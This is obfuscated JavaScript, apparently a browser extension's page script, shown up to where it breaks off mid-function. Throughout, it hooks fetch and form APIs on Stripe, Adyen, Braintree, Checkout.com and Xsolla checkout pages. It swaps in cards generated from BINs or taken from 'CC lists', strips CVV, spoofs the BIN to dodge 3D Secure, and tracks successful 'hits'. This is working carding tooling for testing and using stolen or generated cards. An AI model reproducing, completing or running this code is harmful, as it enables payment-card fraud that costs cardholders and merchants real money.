var __defProp = Object.defineProperty;
var __name = (_0xc3d4d, _0xc28ed9) => __defProp(_0xc3d4d, "name", {
  value: _0xc28ed9,
  configurable: true
});
(function () {
  const _0x522dfb = false;
  const _0xf8ac0b = __name((..._0x2eecfd) => {
    if (_0x522dfb) {}
  }, "debugLog");
  const _0x5c07cd = __name((..._0xefb55b) => {
    if (_0x522dfb) {}
  }, "debugWarn");
  const _0x3dc9af = window.top === window.self;
  const _0xb44711 = ["xsolla.com", "roblox.com", "epicgames.com"];
  const _0x5ccbf7 = _0xb44711.some(_0x16b4f7 => window.location.hostname.includes(_0x16b4f7));
  // Stripe amounts are in the currency's smallest unit (cents/paise). Zero-decimal
  // currencies pass through as-is; all others are divided by 100 for human display.
  // Fixes the "$14 shown as 500000" class of bug on hit forwards.
  const _SEMEX_ZERO_DECIMAL = new Set(["BIF","CLP","DJF","GNF","ISK","JPY","KMF","KRW","MGA","PYG","RWF","UGX","VND","VUV","XAF","XOF","XPF"]);
  function _semexNormalizeStripeAmount(raw, currency) {
    if (raw === null || raw === undefined || raw === "") return null;
    const n = Number(raw);
    if (!isFinite(n)) return null;
    const cur = String(currency || "USD").toUpperCase();
    if (_SEMEX_ZERO_DECIMAL.has(cur)) return n;
    // Heuristic safety: if the value already looks like a human amount (has
    // decimals, or is small enough to be a display amount) just return it.
    if (!Number.isInteger(n) || Math.abs(n) < 100) return n;
    return Math.round(n) / 100;
  }

  window.SEMEX_SETTINGS = {
    cvvBypass: {
      enabled: true,
      gateways: {
        stripe: true,
        adyen: true,
        checkout: true,
        recurly: true,
        xsolla: true,
        braintree: true
      }
    },
    paymentUserAgentBypass: {
      enabled: true
    },
    threeDSBypass: {
      enabled: true
    },
    cardReplacement: {
      enabled: false,
      gateways: {
        stripe: false,
        adyen: false,
        checkout: false,
        recurly: true,
        xsolla: true,
        braintree: true,
        basistheory: true
      }
    },
    paymentTracking: {
      enabled: true,
      gateways: {
        stripe: true,
        adyen: true,
        checkout: true,
        recurly: true,
        xsolla: true,
        braintree: true
      },
      showToast: true,
      onlySuccess: false,
      dismissTime: 5
    }
  };
  let _0x27d875 = false;
  window.addEventListener("message", _0x5ef78b => {
    if (_0x5ef78b.source !== window) {
      return;
    }
    if (_0x5ef78b.data && _0x5ef78b.data.type === "SEMEX_SETTINGS_UPDATE") {
      window.SEMEX_SETTINGS = _0x5ef78b.data.settings;
      _0x19a299 = "";
      if (!_0x27d875 && _0x3dc9af) {
        _0x27d875 = true;
      }
    }
    if (_0x5ef78b.data && _0x5ef78b.data.type === "SEMEX_SESSION_RULES") {
      window.SEMEX_SESSION_RULES = _0x5ef78b.data.rules;
      if (_0x3dc9af && !window.__sessionRulesLogged) {
        window.__sessionRulesLogged = true;
      }
    }
    if (_0x5ef78b.data && _0x5ef78b.data.type === "SEMEX_SET_PENDING_CARD" && _0x5ef78b.data.card) {
      // Store the real BIN card generated during auto-fill so the Stripe fetch
      // hook can swap it in place of the visible test card (4111…).
      window.__SEMEX_PENDING_CARD = _0x5ef78b.data.card;
    }
    if (_0x5ef78b.data && _0x5ef78b.data.type === "SEMEX_REQUEUE_3DS_FAILED_CARD" && _0x5ef78b.data.card && _0x3dc9af) {
      const _0x58fc24 = _0x5ef78b.data.card;
      if (_0x58fc24.number) {
        if (_0x565f1d && typeof _0x565f1d.addCard === "function") {
          _0x565f1d.addCard(_0x58fc24);
          window.postMessage({
            type: "SEMEX_CCLIST_UPDATE",
            remainingText: _0x565f1d.exportToText(),
            remainingCount: _0x565f1d.getCount()
          }, "*");
        } else {
          let _0x35bb0e = _0x58fc24.month || _0x58fc24.exp_month || "01";
          let _0x4eb419 = _0x58fc24.year || _0x58fc24.exp_year || "2030";
          const _0x336938 = _0x58fc24.cvv || _0x58fc24.cvc || "000";
          _0x35bb0e = String(_0x35bb0e).padStart(2, "0");
          _0x4eb419 = String(_0x4eb419);
          if (_0x4eb419.length === 2) {
            _0x4eb419 = "20" + _0x4eb419;
          }
          const _0x1b48c7 = _0x58fc24.number + "|" + _0x35bb0e + "|" + _0x4eb419 + "|" + _0x336938;
          window.postMessage({
            type: "SEMEX_APPEND_CARD_TO_STORAGE",
            cardText: _0x1b48c7
          }, "*");
        }
      }
    }
  });
  window.SEMEX_SESSION_RULES = null;
  window.IS_STRIPE_CHECKOUT = false;
  try {
    if (sessionStorage.getItem("IS_STRIPE_CHECKOUT") === "true") {
      window.IS_STRIPE_CHECKOUT = true;
    }
  } catch (_0x497d29) {}
  // js.stripe.com PAYMENT iframes (elements-inner-*, embedded-checkout-inner-*)
  // ARE checkout contexts — set the flag immediately so response parsing and
  // hit detection treat their Stripe API calls as checkout-scoped. Without
  // this, Payment Element hits on inbuilt merchant pages were intermittently
  // missed because _0x48fa9e() returned false inside the iframe.
  // IMPORTANT: gate on the frame PATH, not just the host — js.stripe.com also
  // serves the hidden /v3/controller-* iframe that loads on ANY page using
  // Stripe.js (blogs, dashboards). Treating controller frames as checkout
  // would misclassify their metrics traffic.
  try {
    const _semexSelfHost = window.location.hostname;
    const _semexSelfHref = String(window.location.href || "");
    if (_semexSelfHost === "js.stripe.com" &&
        (_semexSelfHref.includes("elements-inner") || _semexSelfHref.includes("embedded-checkout-inner"))) {
      window.IS_STRIPE_CHECKOUT = true;
      sessionStorage.setItem("IS_STRIPE_CHECKOUT", "true");
    }
  } catch (_0xJsStErr) {}
  function _0x48fa9e() {
    const _semexHost = window.location.hostname;
    if (window.IS_STRIPE_CHECKOUT || _semexHost === "checkout.stripe.com" || _semexHost === "pay.stripe.com" || _semexHost === "buy.stripe.com" || _semexHost === "donate.stripe.com" || _semexHost === "invoice.stripe.com" || _semexHost === "billing.stripe.com" || _semexHost === "pay.openai.com") return true;
    // Payment Element / Embedded Checkout frames only — never /v3/controller.
    if (_semexHost === "js.stripe.com") {
      try {
        const _h = String(window.location.href || "");
        return _h.includes("elements-inner") || _h.includes("embedded-checkout-inner");
      } catch (_eH) { return false; }
    }
    return false;
  }
  __name(_0x48fa9e, "isCheckoutPage");
  let _0x565f1d = null;
  let _0x19a299 = "";
  let _0x181ec0 = null;
  let _0x1218d8 = null;
  function _0xb1076a() {
    var _0x1b78c1;
    var _0x1008a5;
    const _0x95063 = window.SEMEX_SETTINGS || {};
    const _0x17d9e5 = _0x95063.binOrCCList;
    if (!_0x17d9e5) {
      return null;
    }
    const _0x44a2fc = _0x17d9e5.mode || "bin";
    const _0x564f35 = window.__SEMEX_LOOP_ID;
    if (_0x564f35 && _0x564f35 === _0x181ec0 && _0x1218d8) {
      return _0x1218d8;
    }
    if (_0x44a2fc === "bin") {
      const _0x2cd10b = (_0x17d9e5.bin || "").trim();
      if (!_0x2cd10b || _0x2cd10b.length < 6) {
        return null;
      }
      if (!window.CardGenerator) {
        return null;
      }
      const _0x5635d6 = ((_0x1b78c1 = _0x17d9e5.expiry) == null ? undefined : _0x1b78c1.month) || "RND";
      const _0x50a098 = ((_0x1008a5 = _0x17d9e5.expiry) == null ? undefined : _0x1008a5.year) || "RND";
      const _0x464e56 = _0x17d9e5.cvv || "";
      const _0x46901d = _0x2cd10b.replace(/\D/g, "");
      const _0x37aa18 = _0x46901d.startsWith("34") || _0x46901d.startsWith("37") ? 15 : 16;
      const _0x44de85 = window.CardGenerator.generateCard(_0x2cd10b, _0x37aa18, _0x5635d6, _0x50a098, _0x464e56);
      if (_0x44de85) {
        if (_0x564f35) {
          _0x181ec0 = _0x564f35;
          _0x1218d8 = _0x44de85;
        }
        window.postMessage({
          type: "CARD_REPLACED",
          card: _0x44de85
        }, "*");
        return _0x44de85;
      }
      return null;
    } else if (_0x44a2fc === "ccList") {
      const _0x3f16fb = (_0x17d9e5.ccList || "").trim();
      if (!_0x3f16fb) {
        return null;
      }
      if (!window.CardList) {
        return null;
      }
      const _0x2e923d = _0x3f16fb.length + ":" + _0x3f16fb.slice(0, 50);
      if (!_0x565f1d || _0x19a299 !== _0x2e923d) {
        _0x565f1d = new window.CardList.CardListManager();
        _0x565f1d.loadFromText(_0x3f16fb);
        _0x19a299 = _0x2e923d;
        _0x1218d8 = null;
        _0x181ec0 = null;
      }
      if (_0x565f1d.isEmpty()) {
        _0x19a299 = "";
        window.postMessage({
          type: "SEMEX_TOAST",
          messageType: "WARNING",
          text: "CC List Exhausted! No more cards available."
        }, "*");
        window.postMessage({
          type: "PAYMENT_STATUS_DETECTED",
          status: "NO_CARDS",
          message: "CC List exhausted"
        }, "*");
        return null;
      }
      const _0x21bd5a = _0x565f1d.getNextCard();
      if (_0x21bd5a) {
        if (_0x564f35) {
          _0x181ec0 = _0x564f35;
          _0x1218d8 = _0x21bd5a;
        }
        window.postMessage({
          type: "SEMEX_CCLIST_UPDATE",
          remainingText: _0x565f1d.exportToText(),
          remainingCount: _0x565f1d.getCount()
        }, "*");
        window.postMessage({
          type: "CARD_REPLACED",
          card: _0x21bd5a
        }, "*");
        return _0x21bd5a;
      }
      return null;
    }
    return null;
  }
  __name(_0xb1076a, "getCardForReplacement");
  window.getCardForReplacement = _0xb1076a;
  // Per-gateway Card Replacement gate feedback. Card replacement is already
  // skipped for a gateway whose checkbox is unchecked; this surfaces a clear
  // toast (matching the Stripe overlay gate UX) when the master toggle is ON
  // but the user has unchecked this specific gateway. Deduped per gateway.
  const _semexCROffNotified = new Map();
  function _semexIsCardReplacementGatewayOff(_gw) {
    try {
      const _s = window.SEMEX_SETTINGS || {};
      const _cr = _s.cardReplacement || {};
      const _gws = _cr.gateways || {};
      return !!_cr.enabled && _gws[_gw] === false;
    } catch (_e) {
      return false;
    }
  }
  __name(_semexIsCardReplacementGatewayOff, "isCardReplacementGatewayOff");
  function _semexNotifyCardReplacementOff(_gw) {
    if (!_semexIsCardReplacementGatewayOff(_gw)) {
      return false;
    }
    try {
      const _now = Date.now();
      const _last = _semexCROffNotified.get(_gw) || 0;
      if (_now - _last > 8000) {
        _semexCROffNotified.set(_gw, _now);
        window.postMessage({
          type: "SEMEX_TOAST",
          messageType: "CARD_REPLACEMENT_OFF",
          gateway: _gw,
          url: window.location.href
        }, "*");
      }
    } catch (_e) {}
    return true;
  }
  __name(_semexNotifyCardReplacementOff, "notifyCardReplacementOff");
  let _0x44337b = null;
  let _0x5582de = false;
  let _0x43b771 = false;
  function _0x1b8bea() {
    if (typeof window.JSEncrypt !== "undefined") {
      _0x5582de = true;
      return Promise.resolve(true);
    }
    if (_0x43b771) {
      return new Promise(_0x112263 => {
        const _0x21eae2 = setInterval(() => {
          if (typeof window.JSEncrypt !== "undefined") {
            _0x5582de = true;
            clearInterval(_0x21eae2);
            _0x112263(true);
          }
        }, 100);
        setTimeout(() => {
          clearInterval(_0x21eae2);
          _0x112263(false);
        }, 5000);
      });
    }
    _0x43b771 = true;
    return new Promise(_0x18baf6 => {
      const _0x53d37b = setInterval(() => {
        if (typeof window.JSEncrypt !== "undefined") {
          _0x5582de = true;
          _0x43b771 = false;
          clearInterval(_0x53d37b);
          _0x18baf6(true);
        }
      }, 100);
      setTimeout(() => {
        clearInterval(_0x53d37b);
        _0x43b771 = false;
        if (typeof window.JSEncrypt !== "undefined") {
          _0x5582de = true;
          _0x18baf6(true);
        } else {
          _0x18baf6(false);
        }
      }, 5000);
    });
  }
  __name(_0x1b8bea, "loadJSEncryptIfNeeded");
  function _0x3dc1d1() {
    if (_0x44337b) {
      return _0x44337b;
    }
    try {
      const _0x43c4d5 = document.querySelector("[name=\"xps_public_key\"]");
      if (_0x43c4d5 && _0x43c4d5.value) {
        try {
          const _0x1731fe = atob(String(_0x43c4d5.value).replace(/\s+/g, ""));
          if (/BEGIN PUBLIC KEY/.test(_0x1731fe)) {
            _0x44337b = _0x1731fe;
            return _0x1731fe;
          }
        } catch (_0x270fa1) {}
      }
      const _0x2bdaf1 = document.querySelectorAll("input[type=\"hidden\"]");
      for (const _0x29e67e of _0x2bdaf1) {
        const _0x24f834 = _0x29e67e && _0x29e67e.value;
        if (!_0x24f834 || _0x24f834.length < 100) {
          continue;
        }
        try {
          const _0x13cffa = atob(String(_0x24f834).replace(/\s+/g, ""));
          if (/BEGIN PUBLIC KEY/.test(_0x13cffa)) {
            _0x44337b = _0x13cffa;
            return _0x13cffa;
          }
        } catch (_0x5f038b) {}
      }
      const _0x20dd6b = document.querySelectorAll("script");
      const _0x556fa2 = /[A-Za-z0-9+/=]{200,}/g;
      for (const _0x4af201 of _0x20dd6b) {
        const _0x1859a8 = _0x4af201.textContent;
        if (!_0x1859a8) {
          continue;
        }
        let _0x215dea;
        while ((_0x215dea = _0x556fa2.exec(_0x1859a8)) !== null) {
          try {
            const _0x29bc5c = atob(_0x215dea[0]);
            if (/BEGIN PUBLIC KEY/.test(_0x29bc5c)) {
              _0x44337b = _0x29bc5c;
              return _0x29bc5c;
            }
          } catch (_0x371c36) {}
        }
      }
    } catch (_0x224753) {}
    return null;
  }
  __name(_0x3dc1d1, "resolveXsollaPublicKey");
  function _0x398243(_0x5b652f, _0x31d421, _0x4f3fb1 = true) {
    if (typeof window.JSEncrypt !== "function") {
      return null;
    }
    try {
      const _0x10d4e9 = new window.JSEncrypt();
      _0x10d4e9.setPublicKey(_0x31d421);
      let _0x1c6d16 = String(_0x5b652f.exp_year || _0x5b652f.year || "");
      if (_0x1c6d16.length > 2) {
        _0x1c6d16 = _0x1c6d16.slice(-2);
      }
      const _0x462bf0 = {
        card_number: _0x5b652f.number,
        card_year: _0x1c6d16,
        card_month: String(_0x5b652f.exp_month || _0x5b652f.month || "").padStart(2, "0"),
        cvv: _0x4f3fb1 ? undefined : _0x5b652f.cvc || _0x5b652f.cvv
      };
      return _0x10d4e9.encrypt(JSON.stringify(_0x462bf0));
    } catch (_0x5224b1) {
      return null;
    }
  }
  __name(_0x398243, "encryptXsollaCard");
  function _0x24aeaa(_0x4ffefe, _0x24fd0c = false) {
    let _0x47a4a9 = String(_0x4ffefe.exp_year || _0x4ffefe.year || "");
    if (_0x47a4a9.length > 2) {
      _0x47a4a9 = _0x47a4a9.slice(-2);
    }
    return JSON.stringify({
      card_bin: _0x24fd0c ? "414720" : _0x4ffefe.number.slice(0, 6),
      card_suffix: _0x4ffefe.number.slice(-4),
      card_year: _0x47a4a9,
      card_month: String(_0x4ffefe.exp_month || _0x4ffefe.month || "").padStart(2, "0")
    });
  }
  __name(_0x24aeaa, "buildXsollaOpenCard");
  function _0x427377() {
    var _0x30ac9d;
    var _0x85315;
    var _0x54de97;
    var _0xc73562;
    var _0x28aea3;
    var _0x29ac63;
    const _0x45772e = window.SEMEX_SETTINGS || {};
    const _0x370457 = ((_0x30ac9d = _0x45772e.cvvBypass) == null ? undefined : _0x30ac9d.enabled) && ((_0x54de97 = (_0x85315 = _0x45772e.cvvBypass) == null ? undefined : _0x85315.gateways) == null ? undefined : _0x54de97.xsolla);
    const _0x455bd7 = ((_0xc73562 = _0x45772e.cardReplacement) == null ? undefined : _0xc73562.enabled) && ((_0x29ac63 = (_0x28aea3 = _0x45772e.cardReplacement) == null ? undefined : _0x28aea3.gateways) == null ? undefined : _0x29ac63.xsolla);
    return _0x370457 || _0x455bd7;
  }
  __name(_0x427377, "isXsollaBypassEnabled");
  function _0x2d0df9(_0x429b43, _0x4d1ea9) {
    var _0xf40a13;
    var _0x2cab03;
    var _0x29e0ae;
    var _0xc5bd19;
    try {
      const _0x5c3abb = String(_0x429b43);
      if (_0x5c3abb === "xps_public_key") {
        try {
          const _0x295e21 = atob(String(_0x4d1ea9 || "").replace(/\s+/g, ""));
          if (/BEGIN PUBLIC KEY/.test(_0x295e21)) {
            _0x44337b = _0x295e21;
          }
        } catch (_0x2a2d08) {}
        return _0x4d1ea9;
      }
      if (_0x5c3abb === "xps_encrypted_card" || _0x5c3abb === "xps_open_card") {
        if (!_0x427377()) {
          return _0x4d1ea9;
        }
        // Per-gateway gate: if Card Replacement master is ON but Xsolla is
        // unchecked, refuse to substitute our card and surface a clear toast.
        if (_semexNotifyCardReplacementOff("xsolla")) {
          return _0x4d1ea9;
        }
        const _0x2f2da5 = _0xb1076a();
        const _0x2a0b40 = _0x44337b || _0x3dc1d1();
        if (!_0x2f2da5) {
          return _0x4d1ea9;
        }
        if (!_0x2a0b40) {
          return _0x4d1ea9;
        }
        if (typeof window.JSEncrypt !== "function") {
          return _0x4d1ea9;
        }
        const _0x34cfa6 = window.SEMEX_SETTINGS || {};
        const _0x8c211c = (_0xf40a13 = _0x34cfa6.threeDSBypass) == null ? undefined : _0xf40a13.enabled;
        const _0x227d59 = ((_0x2cab03 = _0x34cfa6.cvvBypass) == null ? undefined : _0x2cab03.enabled) && ((_0xc5bd19 = (_0x29e0ae = _0x34cfa6.cvvBypass) == null ? undefined : _0x29e0ae.gateways) == null ? undefined : _0xc5bd19.xsolla);
        if (_0x5c3abb === "xps_open_card") {
          const _0x2281d9 = _0x24aeaa(_0x2f2da5, _0x8c211c);
          return _0x2281d9;
        }
        if (_0x5c3abb === "xps_encrypted_card") {
          const _0x383483 = _0x398243(_0x2f2da5, _0x2a0b40, _0x227d59);
          if (_0x383483) {
            window.postMessage({
              type: "CARD_REPLACED",
              card: _0x2f2da5
            }, "*");
            if (_0x227d59) {
              window.postMessage({
                type: "SEMEX_TOAST",
                messageType: "BYPASS_ACTIVATED",
                gateway: "Xsolla",
                bypassTypes: ["CVV"],
                url: window.location.href
              }, "*");
            }
            window.__LAST_CAPTURED_CARD = {
              number: _0x2f2da5.number,
              month: _0x2f2da5.exp_month || _0x2f2da5.month,
              year: _0x2f2da5.exp_year || _0x2f2da5.year,
              cvv: _0x2f2da5.cvc || _0x2f2da5.cvv
            };
            return _0x383483;
          } else {}
        }
      }
    } catch (_0x504e17) {}
    return _0x4d1ea9;
  }
  __name(_0x2d0df9, "xsollaMaybeRewrite");
  if (_0x5ccbf7) {
    const _0x34f3db = URLSearchParams.prototype.set;
    const _0x214eb8 = URLSearchParams.prototype.append;
    URLSearchParams.prototype.set = function (_0x29221e, _0x142283) {
      const _0x1b4173 = _0x2d0df9(_0x29221e, _0x142283);
      return _0x34f3db.call(this, _0x29221e, _0x1b4173);
    };
    URLSearchParams.prototype.append = function (_0x414da5, _0xa0f324) {
      const _0x3348d8 = _0x2d0df9(_0x414da5, _0xa0f324);
      return _0x214eb8.call(this, _0x414da5, _0x3348d8);
    };
    const _0xe5135b = FormData.prototype.set;
    const _0x553c4f = FormData.prototype.append;
    FormData.prototype.set = function (_0x3450a1, _0x5f0c68) {
      const _0x5ab348 = _0x2d0df9(_0x3450a1, _0x5f0c68);
      return _0xe5135b.call(this, _0x3450a1, _0x5ab348);
    };
    FormData.prototype.append = function (_0x568449, _0x1a6305) {
      const _0x4e2785 = _0x2d0df9(_0x568449, _0x1a6305);
      return _0x553c4f.call(this, _0x568449, _0x4e2785);
    };
    _0x1b8bea().then(_0x2de248 => {});
  }
  // Cloudflare challenge / Turnstile traffic must pass through 100%
  // untouched. Our POST body inspection/buffering corrupts the challenge
  // proof-of-work and the user can NEVER clear the captcha (owner-reported:
  // "CF captcha blocked on sites while extension is on"). The iframe origin
  // is manifest-excluded, but merchant pages fire CF requests from the TOP
  // frame too — those hit these hooks.
  // Match the PARSED host/path, not raw substrings — a merchant payment URL
  // with "turnstile" or "cdn-cgi" in a query value must still be intercepted.
  function _semexIsCloudflareURL(_u) {
    try {
      const _p = new URL(String(_u || ""), window.location.href);
      return _p.hostname === "challenges.cloudflare.com" ||
        _p.hostname.endsWith(".cloudflare.com") ||
        _p.pathname.startsWith("/cdn-cgi/");
    } catch (_e) {
      return false;
    }
  }
  const _0x416754 = window.fetch;
  const _0x221b9b = window.XMLHttpRequest;
  window.fetch = async function (_0xad7dcb, _0x45460c) {
    var _0x3d5380;
    var _0x4c5cba;
    var _0x1cb009;
    var _0x544262;
    var _0x4e437c;
    var _0x2a9f3b;
    var _0x1ee39e;
    var _0x23c429;
    var _0x47275c;
    var _0x4fb237;
    var _0x2d4943;
    var _0x44886e;
    var _0x4cdbc9;
    var _0x4dd6cf;
    var _0x278332;
    var _0x2cd542;
    var _0x426beb;
    var _0x2b00e3;
    var _0x877dac;
    var _0x13a105;
    var _0x311992;
    var _0x279714;
    var _0x4ccaf5;
    var _0x25900b;
    var _0x1f69e3;
    var _0xe31943;
    var _0x130807;
    var _0x47dbb4;
    var _0x236e2c;
    var _0x3bf346;
    var _0x2e1457;
    var _0x57df29;
    var _0x4689e9;
    var _0x4576bd;
    var _0x298ab1;
    var _0x15fefe;
    var _0x26c64b;
    var _0x3bb81e;
    var _0x228a9f;
    var _0x4991c4;
    var _0x2df114;
    var _0x1aa3f1;
    let _0x1239ce = _0xad7dcb;
    if (_0xad7dcb instanceof Request) {
      _0x1239ce = _0xad7dcb.url;
    }
    _0x1239ce = String(_0x1239ce || "");
    // Cloudflare / Turnstile pass-through — see _semexIsCloudflareURL.
    if (_semexIsCloudflareURL(_0x1239ce)) {
      return _0x416754.apply(this, arguments);
    }
    let _0x317bff = "GET";
    if (_0x45460c && _0x45460c.method) {
      _0x317bff = _0x45460c.method.toUpperCase();
    } else if (_0xad7dcb instanceof Request) {
      _0x317bff = _0xad7dcb.method.toUpperCase();
    }
    const _0x510013 = _0x317bff === "POST" || _0x317bff === "PUT" || _0x317bff === "PATCH";
    const _0x41e50e = _0x317bff === "GET" && _0x1239ce.includes("api.stripe.com") && (_0x1239ce.includes("/payment_intents/") || _0x1239ce.includes("/setup_intents/"));
    const _0x54ceef = _0x1239ce.includes("/payment_pages/") && _0x1239ce.includes("/init");
    if (!_0x510013 && !_0x41e50e && !_0x54ceef) {
      return _0x416754.apply(this, arguments);
    }
    if (_0x1239ce.includes("admin-ajax.php")) {
      let _0x229279 = false;
      try {
        if (_0x45460c && _0x45460c.body && typeof _0x45460c.body === "string") {
          if (_0x45460c.body.includes("wc-stripe") || _0x45460c.body.includes("action=wc_stripe") || _0x45460c.body.includes("stripe_payment")) {
            _0x229279 = true;
          }
        } else if (_0xad7dcb instanceof Request) {}
      } catch (_0xa0ed51) {}
      if (!_0x229279) {
        return _0x416754.apply(this, arguments);
      }
    }
    try {
      const _0x53306b = _0x29b65c(_0x1239ce);
      if (_0x53306b && _0x510013) {
        if (_0x45460c && _0x45460c.body) {
          const _0x568a23 = _0xd23bbe(_0x45460c.body);
          if (_0x568a23) {
            _0x435696(_0x568a23);
          }
        } else if (_0xad7dcb instanceof Request) {
          try {
            const _0x2384db = _0xad7dcb.clone();
            const _0xe4e587 = await _0x2384db.text();
            const _0x25cbbb = _0xd23bbe(_0xe4e587);
            if (_0x25cbbb) {
              _0x435696(_0x25cbbb);
            }
          } catch (_0x1f6903) {}
        }
      }
    } catch (_0x37608f) {}
    try {
      const _0x1f04a2 = _0x1239ce.includes("xsolla.com") || _0x1239ce.includes("directpayment");
      if (_0x1f04a2 && _0x510013) {
        let _0x535936 = null;
        if (_0x45460c && _0x45460c.body && typeof _0x45460c.body === "string") {
          _0x535936 = _0x45460c.body;
        } else if (_0xad7dcb instanceof Request) {
          try {
            const _0x56df16 = _0xad7dcb.clone();
            _0x535936 = await _0x56df16.text();
            if (!_0x45460c) {
              _0x45460c = {};
            }
            _0x45460c.body = _0x535936;
            if (!_0x45460c.method) {
              _0x45460c.method = _0xad7dcb.method;
            }
            if (!_0x45460c.headers && _0xad7dcb.headers) {
              _0x45460c.headers = {};
              _0xad7dcb.headers.forEach((_0x499f8d, _0x17cf14) => _0x45460c.headers[_0x17cf14] = _0x499f8d);
            }
          } catch (_0x3340ad) {}
        }
        if (_0x535936 && _0x535936.includes("xps_encrypted_card")) {
          const _0x2b0b23 = window.SEMEX_SETTINGS || {};
          const _0x5ffd24 = ((_0x3d5380 = _0x2b0b23.cvvBypass) == null ? undefined : _0x3d5380.enabled) && (((_0x1cb009 = (_0x4c5cba = _0x2b0b23.cvvBypass) == null ? undefined : _0x4c5cba.gateways) == null ? undefined : _0x1cb009.xsolla) ?? true);
          const _0x2926d7 = ((_0x544262 = _0x2b0b23.cardReplacement) == null ? undefined : _0x544262.enabled) && (((_0x2a9f3b = (_0x4e437c = _0x2b0b23.cardReplacement) == null ? undefined : _0x4e437c.gateways) == null ? undefined : _0x2a9f3b.xsolla) ?? true);
          if (_semexNotifyCardReplacementOff("xsolla")) {} else if (_0x5ffd24 || _0x2926d7) {
            const _0x2ea88d = _0x535936.match(/xps_public_key=([^&]+)/);
            if (_0x2ea88d) {
              const _0x3dab6c = _0x2ea88d[1];
              try {
                const _0x5034a1 = atob(decodeURIComponent(_0x3dab6c).replace(/\s+/g, ""));
                if (/BEGIN PUBLIC KEY/.test(_0x5034a1)) {
                  const _0x3cfc15 = _0xb1076a();
                  if (_0x3cfc15 && _0x3cfc15.number && typeof window.JSEncrypt === "function") {
                    let _0x38574c = String(_0x3cfc15.exp_year || _0x3cfc15.year || "");
                    if (_0x38574c.length > 2) {
                      _0x38574c = _0x38574c.slice(-2);
                    }
                    const _0x58cd41 = {
                      card_number: _0x3cfc15.number,
                      card_year: _0x38574c,
                      card_month: String(_0x3cfc15.exp_month || _0x3cfc15.month || "").padStart(2, "0"),
                      cvv: _0x5ffd24 ? undefined : _0x3cfc15.cvc || _0x3cfc15.cvv
                    };
                    const _0x4486b6 = new window.JSEncrypt();
                    _0x4486b6.setPublicKey(_0x5034a1);
                    const _0x1d27d0 = _0x4486b6.encrypt(JSON.stringify(_0x58cd41));
                    if (_0x1d27d0) {
                      const _0x4f9125 = (_0x1ee39e = _0x2b0b23.threeDSBypass) == null ? undefined : _0x1ee39e.enabled;
                      const _0x51ad93 = {
                        card_bin: _0x4f9125 ? "414720" : _0x3cfc15.number.slice(0, 6),
                        card_suffix: _0x3cfc15.number.slice(-4),
                        card_year: _0x38574c,
                        card_month: String(_0x3cfc15.exp_month || _0x3cfc15.month || "").padStart(2, "0")
                      };
                      let _0x9ed076 = _0x535936;
                      _0x9ed076 = _0x9ed076.replace(/(xps_encrypted_card=)[^&]*/, "$1" + encodeURIComponent(_0x1d27d0));
                      _0x9ed076 = _0x9ed076.replace(/(xps_open_card=)[^&]*/, "$1" + encodeURIComponent(JSON.stringify(_0x51ad93)));
                      _0x45460c.body = _0x9ed076;
                      _0x435696({
                        number: _0x3cfc15.number,
                        month: _0x3cfc15.exp_month || _0x3cfc15.month,
                        year: _0x3cfc15.exp_year || _0x3cfc15.year,
                        cvv: _0x3cfc15.cvc || _0x3cfc15.cvv
                      });
                      window.__LAST_CAPTURED_CARD = {
                        number: _0x3cfc15.number,
                        month: _0x3cfc15.exp_month || _0x3cfc15.month,
                        year: _0x3cfc15.exp_year || _0x3cfc15.year,
                        cvv: _0x3cfc15.cvc || _0x3cfc15.cvv
                      };
                      if (_0x5ffd24) {
                        window.postMessage({
                          type: "SEMEX_TOAST",
                          messageType: "BYPASS_ACTIVATED",
                          gateway: "Xsolla",
                          bypassTypes: ["CVV"],
                          url: _0x1239ce
                        }, "*");
                      }
                    } else {}
                  } else {}
                }
              } catch (_0x4a152b) {}
            } else {}
          }
        }
      }
    } catch (_0xc4b89f) {}
    let _0x4f3296;
    const _0x8ce893 = _0x1239ce.includes("api.stripe.com") || _0x1239ce.includes("adyen.com") || _0x1239ce.includes("/adyen") || _0x1239ce.includes("checkout.com") || _0x1239ce.includes("braintree-api.com") || _0x1239ce.includes("braintreegateway.com") || _0x1239ce.includes("client.bin.paypal.com") || _0x1239ce.includes("basistheory.com");
    const _0x2c78d4 = window.SEMEX_SETTINGS || {};
    const _0x1f93e0 = ((_0x23c429 = _0x2c78d4.cvvBypass) == null ? undefined : _0x23c429.enabled) ?? true;
    const _0x1ee770 = ((_0x47275c = _0x2c78d4.paymentUserAgentBypass) == null ? undefined : _0x47275c.enabled) ?? true;
    const _0x43a6e3 = ((_0x4fb237 = _0x2c78d4.threeDSBypass) == null ? undefined : _0x4fb237.enabled) ?? true;
    const _0x40f9fa = ((_0x2d4943 = _0x2c78d4.cardReplacement) == null ? undefined : _0x2d4943.enabled) && ((_0x4cdbc9 = (_0x44886e = _0x2c78d4.cardReplacement) == null ? undefined : _0x44886e.gateways) == null ? undefined : _0x4cdbc9.stripe);
    let _0x29e430 = false;
    if (_0x1239ce.includes("api.stripe.com")) {
      _0x29e430 = _0x1f93e0 && ((_0x278332 = (_0x4dd6cf = _0x2c78d4.cvvBypass) == null ? undefined : _0x4dd6cf.gateways) == null ? undefined : _0x278332.stripe) || _0x1ee770 || _0x43a6e3 || _0x40f9fa;
    } else if (_0x1239ce.includes("adyen.com") || _0x1239ce.includes("/adyen")) {
      const _0x3b5d34 = ((_0x2cd542 = _0x2c78d4.cardReplacement) == null ? undefined : _0x2cd542.enabled) && ((_0x2b00e3 = (_0x426beb = _0x2c78d4.cardReplacement) == null ? undefined : _0x426beb.gateways) == null ? undefined : _0x2b00e3.adyen);
      _0x29e430 = _0x1f93e0 && ((_0x13a105 = (_0x877dac = _0x2c78d4.cvvBypass) == null ? undefined : _0x877dac.gateways) == null ? undefined : _0x13a105.adyen) || _0x3b5d34;
    } else if (_0x1239ce.includes("checkout.com")) {
      const _0xf815f8 = ((_0x311992 = _0x2c78d4.cardReplacement) == null ? undefined : _0x311992.enabled) && ((_0x4ccaf5 = (_0x279714 = _0x2c78d4.cardReplacement) == null ? undefined : _0x279714.gateways) == null ? undefined : _0x4ccaf5.checkout);
      _0x29e430 = _0x1f93e0 && ((_0x1f69e3 = (_0x25900b = _0x2c78d4.cvvBypass) == null ? undefined : _0x25900b.gateways) == null ? undefined : _0x1f69e3.checkout) || _0xf815f8;
    } else if (_0x1239ce.includes("braintree-api.com") || _0x1239ce.includes("braintreegateway.com") || _0x1239ce.includes("client.bin.paypal.com")) {
      const _0xbtCrFlg = !!(_0x2c78d4.cardReplacement?.enabled && _0x2c78d4.cardReplacement?.gateways?.braintree);
